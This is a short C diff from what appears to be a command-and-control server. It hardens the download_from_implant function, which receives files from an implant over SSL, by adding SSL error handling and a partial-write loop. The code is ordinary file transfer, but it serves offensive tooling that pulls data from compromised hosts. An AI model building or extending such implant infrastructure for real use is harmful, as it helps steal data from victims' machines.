@@ -316,7 +316,7 @@ int download_from_implant(SSL *ssl) {
         }
     
         log_message(LOG_INFO, "Writing To File : %s ", filepath);
-        size_t bytesRead;
+        int bytesRead;
         size_t filesize;
         char FileSize[BUFFER_SIZE];
         SSL_read(ssl, FileSize, sizeof(FileSize));
@@ -324,11 +324,43 @@ int download_from_implant(SSL *ssl) {
         filesize =  (size_t)atoi(FileSize);
 
         size_t received = 0;
+        //while (received < filesize) {
+        //    bytesRead = SSL_read(ssl, contents, FILE_CHUNK);
+        //    //write(fd, contents, bytesRead);
+        //    if (write(fd, contents, bytesRead) != bytesRead) {
+        //        continue;
+        //    }
+        //    received += bytesRead;
+        //}
+        ssize_t bytesWritten;
         while (received < filesize) {
-            bytesRead = SSL_read(ssl, contents, FILE_CHUNK);
-            write(fd, contents, bytesRead);
-            received += bytesRead;
+    bytesRead = SSL_read(ssl, contents, FILE_CHUNK);
+
+    if (bytesRead <= 0) {
+        int err = SSL_get_error(ssl, bytesRead);
+        if (err == SSL_ERROR_ZERO_RETURN) {
+            log_message(LOG_ERROR, "SSL connection closed cleanly.\n");
+            break;
+        } else {
+            log_message(LOG_ERROR, "SSL_read error: %d\n", err);
+            
+            break;
         }
+    }
+
+    ssize_t totalWritten = 0;
+    while (totalWritten < bytesRead) {
+        bytesWritten = write(fd, contents + totalWritten, bytesRead - totalWritten);
+        if (bytesWritten < 0) {
+            log_message(LOG_ERROR, "Write Failed");
+            return -1;
+        }
+        totalWritten += bytesWritten;
+    }
+
+    received += bytesRead;
+}
+
 
         log_message(LOG_INFO, "Wrote Data To File : %s ", filepath);
         free(contents);
